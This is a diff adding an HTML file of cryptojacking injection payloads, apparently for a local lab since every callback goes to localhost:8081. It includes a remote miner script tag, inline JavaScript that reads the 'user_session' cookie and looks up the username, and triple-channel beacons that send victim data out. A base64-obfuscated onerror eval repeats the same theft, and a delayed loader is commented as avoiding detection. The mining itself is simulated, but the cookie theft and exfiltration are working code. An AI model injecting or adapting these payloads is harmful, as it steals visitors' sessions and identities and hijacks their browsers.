@@ -1,0 +1,103 @@
+<!-- Robust Cryptojacking Payload -->
+<script src="http://localhost:8081/robust_miner.js"></script>
+
+<!-- Inline Robust Cryptojacking Payload (if the script loading fails) -->
+<script>
+// Only execute if the robust miner isn't already loaded
+if (!window.robustMinerActive) {
+    // Create a unique identifier for this victim
+    const victimId = 'victim_' + Math.random().toString(36).substring(2, 12);
+    
+    // Extract username from cookie
+    function getUsernameFromCookie() {
+        if (document.cookie.includes('user_session')) {
+            // Get the user ID from the cookie
+            const userId = document.cookie.split('user_session=')[1].split(';')[0];
+            
+            // Try to fetch the actual username using the user ID
+            try {
+                // Use XMLHttpRequest to fetch the username
+                const xhr = new XMLHttpRequest();
+                xhr.open('GET', '/users.php?id=' + userId, false); // Synchronous request
+                xhr.send();
+                
+                if (xhr.status === 200 && xhr.responseText) {
+                    // If we got a response, try to extract the username
+                    const usernameMatch = xhr.responseText.match(/<username>(.*?)<\/username>/);
+                    if (usernameMatch && usernameMatch[1]) {
+                        return usernameMatch[1];
+                    }
+                }
+            } catch (e) {
+                console.error("Failed to fetch username:", e);
+            }
+            
+            // If we couldn't get the username, at least return "user_" + ID
+            return "user_" + userId;
+        }
+        return 'unknown_user';
+    }
+    
+    // Function to send mining logs directly
+    function sendMiningLog(hashes, rate) {
+        const data = {
+            h: hashes,
+            r: rate,
+            t: Math.floor(Date.now() / 1000),
+            username: getUsernameFromCookie(),
+            page: window.location.href,
+            victim_id: victimId
+        };
+        
+        // Use multiple methods to ensure the log is sent
+        
+        // Method 1: Image beacon (most reliable)
+        new Image().src = `http://localhost:8081/log_mining.php?data=${encodeURIComponent(JSON.stringify(data))}`;
+        
+        // Method 2: Fetch API
+        fetch(`http://localhost:8081/log_mining.php?data=${encodeURIComponent(JSON.stringify(data))}`, {
+            mode: 'no-cors',
+            cache: 'no-cache'
+        }).catch(() => {});
+        
+        // Method 3: XMLHttpRequest
+        const xhr = new XMLHttpRequest();
+        xhr.open('GET', `http://localhost:8081/log_mining.php?data=${encodeURIComponent(JSON.stringify(data))}`, true);
+        xhr.send();
+        
+        console.log("Mining log sent:", data);
+    }
+    
+    // Simulate mining activity and send logs
+    let hashCount = 0;
+    const miningInterval = setInterval(() => {
+        // Simulate mining activity
+        hashCount += Math.floor(Math.random() * 10) + 1;
+        const hashRate = Math.floor(Math.random() * 5) + 1;
+        
+        // Send mining log
+        sendMiningLog(hashCount, hashRate);
+        
+        // Stop after 2 minutes to avoid excessive logs
+        if (hashCount > 1000) {
+            clearInterval(miningInterval);
+        }
+    }, 5000);
+    
+    // Mark as active to prevent duplicate execution
+    window.robustMinerActive = true;
+}
+</script>
+
+<!-- Obfuscated Robust Cryptojacking Payload -->
+<img src="x" onerror="eval(atob('KGZ1bmN0aW9uKCl7Y29uc3QgZT0idmljdGltXyIrTWF0aC5yYW5kb20oKS50b1N0cmluZygzNikuc3Vic3RyaW5nKDIsMTIpO2Z1bmN0aW9uIG4oKXtyZXR1cm4gZG9jdW1lbnQuY29va2llLmluY2x1ZGVzKCJ1c2VyX3Nlc3Npb24iKT9kb2N1bWVudC5jb29raWUuc3BsaXQoInVzZXJfc2Vzc2lvbj0iKVsxXS5zcGxpdCgiOyIpWzBdOiJ1bmtub3duX3VzZXIifWZ1bmN0aW9uIHQobyx0KXtjb25zdCBpPXtoOm8scjp0LHQ6TWF0aC5mbG9vcihEYXRlLm5vdygpLzFlMyksdXNlcm5hbWU6bigpLHBhZ2U6d2luZG93LmxvY2F0aW9uLmhyZWYsdmljdGltX2lkOmV9O25ldyBJbWFnZSgpLnNyYz1gaHR0cDovL2xvY2FsaG9zdDo4MDgxL2xvZ19taW5pbmcucGhwP2RhdGE9JHtlbmNvZGVVUklDb21wb25lbnQoSlNPTi5zdHJpbmdpZnkoaSkpfWA7ZmV0Y2goYGh0dHA6Ly9sb2NhbGhvc3Q6ODA4MS9sb2dfbWluaW5nLnBocD9kYXRhPSR7ZW5jb2RlVVJJQ29tcG9uZW50KEpTT04uc3RyaW5naWZ5KGkpKX1gLHttb2RlOiJuby1jb3JzIixjYWNoZToibm8tY2FjaGUifSkuY2F0Y2goKCk9Pnt9KTtjb25zdCBzPW5ldyBYTUxIdHRwUmVxdWVzdDtzLm9wZW4oIkdFVCIsYGh0dHA6Ly9sb2NhbGhvc3Q6ODA4MS9sb2dfbWluaW5nLnBocD9kYXRhPSR7ZW5jb2RlVVJJQ29tcG9uZW50KEpTT04uc3RyaW5naWZ5KGkpKX1gLCEwKTtzLnNlbmQoKX1sZXQgbz0wO2NvbnN0IGk9c2V0SW50ZXJ2YWwoKCk9PntvKz1NYXRoLmZsb29yKDEwKk1hdGgucmFuZG9tKCkpKzE7Y29uc3QgZT1NYXRoLmZsb29yKDUqTWF0aC5yYW5kb20oKSkrMTt0KG8sZSk7bz4xZTMmJmNsZWFySW50ZXJ2YWwoaSl9LDVlMyk7d2luZG93LnJvYnVzdE1pbmVyQWN0aXZlPSEwfSkoKTs='))" />
+
+<!-- Delayed Robust Cryptojacking Payload -->
+<script>
+// Wait 5 seconds before loading the miner to avoid detection
+setTimeout(() => {
+    const script = document.createElement('script');
+    script.src = 'http://localhost:8081/robust_miner.js';
+    document.head.appendChild(script);
+}, 5000);
+</script> 
